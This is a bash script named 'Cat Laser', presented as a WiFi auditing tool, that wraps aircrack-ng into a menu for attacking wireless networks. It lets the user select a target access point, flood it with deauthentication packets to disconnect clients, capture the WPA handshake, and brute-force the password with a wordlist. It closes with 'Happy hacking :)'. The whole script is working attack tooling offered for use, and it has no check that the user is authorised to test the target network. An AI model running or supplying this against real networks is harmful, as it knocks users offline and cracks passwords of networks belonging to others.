#!/bin/bash

# Coded by u2ru
# Github: https://github.com/u2ru
# Wifi Auditing tool Cat Laser

if [[ $EUID -ne 0 ]]; then
	echo -e "   \e[40;38;5;82mPlease run script as root\e[49m"
	exit 0
fi

netdevice=$(iw dev | awk '$1=="Interface"{print $2}')

bssid=""
channel=""

echo
sleep 1

echo "Checking for installed packages!..."

sleep 2

function check {
	if ! dpkg-query -s $1 1> /dev/null 2>&1 ; then
		echo -n $1; echo -e ": Not installed! \e[31m[X]\e[39m"
		echo -n "Do you want to install missing packages? [y/n]"; read inst
			if [[ $inst == 'n' ]] || [[ $inst == 'no' ]] || [[ $inst == 'N' ]]; then
				echo "."
			else
				echo "Installing..."
				echo `$(apt install $1 -y)`
			fi
	else
		echo -n $1; echo -e ": Installed \e[32m[OK]\e[39m"
	fi
}

function restartWIFI {
	echo "$(nmcli radio wifi off)"
	sleep .3
	echo "$(nmcli radio wifi on)"
}

function closeAttack {
	echo "$(ps -e|grep airodump-ng|kill -9 $(awk '{print $1}') &> /dev/null)"
	echo "Killing processes..."
	echo "$(ps -e|grep aireplay-ng|kill -9 $(awk '{print $1}') &> /dev/null)"
	echo "$(ps -e|grep aircrack-ng|kill -9 $(awk '{print $1}') &> /dev/null)"
}

function bruteforce {
	echo "$(mkdir handshakes -p)"
	echo "Choose a handshake to bruteforce: "
	echo "Looking for files in handshakes/ directory"
	echo
	handshake_dir=( "handshakes"/* )
	filescount="$(ls handshakes/ | grep .cap | awk '{print $1}' | wc -l)"
	if [[ $filescount == 0 ]]; then
		echo -e "    \e[5m\e[31mNo handshakes found...\e[39m\e[25m"
		sleep 1
		main
	else
		for (( i = 0; i < $filescount; i++ )); do
			let t=$i+1
			printf "    [$t] ${handshake_dir[$i]}\n"
		done
	fi
	echo
	echo -n "CatLaser/Bruteforce =>> "; read bruterepl
	let bnum=$bruterepl-1
	choosenfile=$(echo ${handshake_dir[$bnum]})
	echo "Choosen file is: $choosenfile"
	echo
	echo -n "Path to passlist [default: wordlist.txt]: "; read pathlist
	if [[ $pathlist == null ]] || [[ $pathlist == "" ]] || [[ $pathlist == " " ]]; then
		pathlist="wordlist.txt"
	fi
	echo "Starting brute..."
	echo "$(gnome-terminal -- aircrack-ng -b $bssid -w $pathlist $choosenfile)"
	echo "Pass: $pathlist"
	echo "Bssid: $bssid"
	echo "File: $choosenfile"
	sleep 1
	echo
	echo "Happy hacking :)"
	echo "Exiting..."
	echo
	sleep 1
	exit 0
}

function checkforbrute {
	echo -e $(gnome-terminal bash -x airodump-ng $netdevice)
	echo -n "Choose a target bssid: "; read targbssid
	echo
	bssid=$targbssid
	echo "Target bssid: $bssid"
	echo
	echo -n ">> Correct ? [y/n]"; read proff
	echo "$(ps -e | grep airodump-ng | kill -9 $(awk '{print $1}') &> /dev/null)"
	if [[ $proff == 'n' ]] || [[ $proff == 'N' ]] || [[ $proff == 'no' ]]; then
		echo "OK..."
		checkforbrute
	else
		bruteforce
	fi
}

function handshake {
	echo "$(mkdir handshakes -p)"
	echo "Checking dir..."
	datet=$(date +'%d-%m-%Y%M-%S')
	echo "$(gnome-terminal -- airodump-ng -c $channel --bssid $bssid --output-format cap -w handshakes/$datet $netdevice )"
	sleep .2
	for (( i = 0; i < 4; i++ )); do
		echo "$(gnome-terminal -- aireplay-ng -0 20 -a $bssid $netdevice)"
		sleep 3
		echo "Sending deauth packets..."
	done
	echo -e "\e[32mIf you see: [ WPA handshake: $bssid"
	echo -e "Then handshake successfuly captured!\e[39m"
	echo -e "Close window \e[5m[ Ctrl + C ]\e[25m"
}

function attack {
	netdevice=$(iw dev | awk '$1=="Interface"{print $2}')
	echo -e $(gnome-terminal -- aireplay-ng -0 1000 -a $bssid $netdevice)
	echo "Attack started"
	echo
	echo -e "\e[5m[ Type =>> 0 ] for closing attack\e[25m"
	echo
}

function audit {
	echo -e $(gnome-terminal bash -x airodump-ng $netdevice)
	echo -n ">> Enter BSSID: "; read bssid
	echo -n ">> Enter [CH] Channel: "; read channel
	echo "$(ps -e|grep airodump-ng|kill -9 $(awk '{print $1}') &> /dev/null)"
	sleep .5
	echo ">> BSSID: $bssid"
	echo ">> Channel: $channel"
	echo
	echo -n ">> Correct ? [y/n]"; read prof
	if [[ $prof == 'n' ]] || [[ $prof == 'N' ]] || [[ $prof == 'no' ]]; then
		echo "OK..."
		audit
	else
		main
	fi

}

function main {
	echo
	echo -e '                                       
    .                                  
  ,/*,*                         *,*/*  
  /((***.                     .***((/  
  **/*****                   *****/**. 
  **/(/*///.               .///*/(/**. 
  *,*/.,,//(. .  ...,.  . ,/(/*,./*,*  
  .,,,.*,****//&&*/*/*&&*(****,*.,,,.  
  .**/*.,**(/(#%(*#*#*(%((/(**, */**.  
  ,,**.,/*/*/#%(/#%(#(/(%#/,///,.**,,  
   *(*,*,*****%.*#*#*%*.#/,***,***/*   
   ,**,*,,(%(,/,*,*/*,,,/,(%(,,*,***   
  .**,.,*%((,%#  **/**  %#,((%*,.,**.  
  .*(%(,../*&*(% ,,,,, %(*&*/..,(%(*.  
   *((,,*//.  ,%//***//%*  .//*,,/(/   
    *,,,*//,(*#%((////#%#,(,//**,,*    
    //(*(,*/,/.,*#(((%/,./,//,(*(//    
     (#(((,,......%&%,.....,,(((#(.    
       .*///*(,,,,(,,,,(*//**.       
          .*(/*(#(*/*(#(//(,.          
                ///(///                
                  ...                  '
	echo
	echo -e "\n\t\e[31m#\e[39m#####################\e[31m#\e[39m\n\t#      Cat Laser      #\n\t\e[31m#\e[39m#####################\e[31m#\e[39m\n"
	echo
	echo -e "\e[31m+\e[39m===[   Author  : u2ru            ]===\e[31m+\e[39m"
	echo -e "\e[31m+\e[39m===[   Github  : github.com/u2ru ]===\e[31m+\e[39m"
	echo
	echo "     [1] Select target"
	echo "     [2] Wifi deauthentication"
	echo "     [3] Catch a Handshake"
	echo "     [4] Start a brute force (Handshake needed!)"
	echo -e "   \e[31m[0] Exit\e[39m"
	echo
	echo " 'Help' for this menu"
	echo
	echo -en "  Your wireless device is: \e[32m$netdevice\e[39m"
	echo
	if [[ $bssid != "" ]]; then
		echo "  Target:"
		echo "    Bssid: $bssid"
		echo "    Channel: $channel"
	fi
	echo
	state=true
	while [[ $state == true ]]; do
		echo -n "CatLaser =>> "; read repl
		case $repl in
			0)
				echo "Exit..."
				closeAttack
				restartWIFI
				exit 0
			;;

			1)
				audit
			;;

			2)
				if [[ $bssid != "" ]] ; then
					if [[ $channel != "" ]]; then
						echo -e $(gnome-terminal bash -x airodump-ng $netdevice -c $channel)
						sleep .5
						attack
					else
						echo -e "Choose a target (CH) channel \e[32m[1]\e[39m"
					fi
				else
					echo "Choose a target [1]"
				fi
			;;

			3)
				if [[ $bssid != "" ]]; then
					echo "Capturing a handshake..."
					handshake
				else
					echo "Choose a target [1]"
				fi
			;;

			4)
				checkforbrute
			;;

			"Help")
				echo "Help..."
				state=false
				main
			;;

			*)
				echo "Command not found: type Help"
			;;
		esac
	done
}

echo

# Packages!
check aircrack-ng

main
